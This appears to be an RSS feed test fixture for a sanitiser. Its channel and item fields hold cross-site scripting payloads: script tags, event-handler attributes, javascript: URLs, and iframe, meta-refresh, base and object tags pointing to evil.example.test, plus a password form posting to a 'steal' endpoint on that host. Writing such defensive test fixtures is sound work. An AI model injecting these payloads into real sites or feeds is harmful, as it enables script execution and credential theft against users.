    <title>Hostile HTML &lt;script&gt;alert('channel')&lt;/script&gt;</title>
    <link>javascript:alert('channel-link')</link>
    <description>Feed content that tries to run script. Every payload must be neutralised by the sanitiser; see e2e/fixtures/xss/payloads.json for the full set.</description>
    <item>
      <title>&lt;img src=x onerror=alert('title')&gt;</title>
      <link>javascript:alert('item-link')</link>
      <guid isPermaLink="false">hostile-1</guid>
      <pubDate>Tue, 10 Nov 2026 09:00:00 GMT</pubDate>
      <description><![CDATA[<script>alert('desc')</script><p onclick="alert('onclick')">click</p>]]></description>
      <content:encoded><![CDATA[
        <p>Hello</p>
        <script>window.__pwned = 'script'</script>
        <img src="x" onerror="window.__pwned = 'img'">
        <a href="javascript:window.__pwned='href'">js link</a>
        <iframe src="https://evil.example.test/frame"></iframe>
        <svg onload="window.__pwned='svg'"><script>window.__pwned='svgscript'</script></svg>
        <form action="https://evil.example.test/steal"><input name="pw" type="password"></form>
        <style>body{display:none}</style>
        <meta http-equiv="refresh" content="0;url=https://evil.example.test/">
        <base href="https://evil.example.test/">
        <object data="https://evil.example.test/x.swf"></object>
        <div style="background:url(javascript:alert(1))">styled</div>
        <a href="https://ok.example.test/" target="_blank">target blank without rel</a>
      ]]></content:encoded>
    </item>
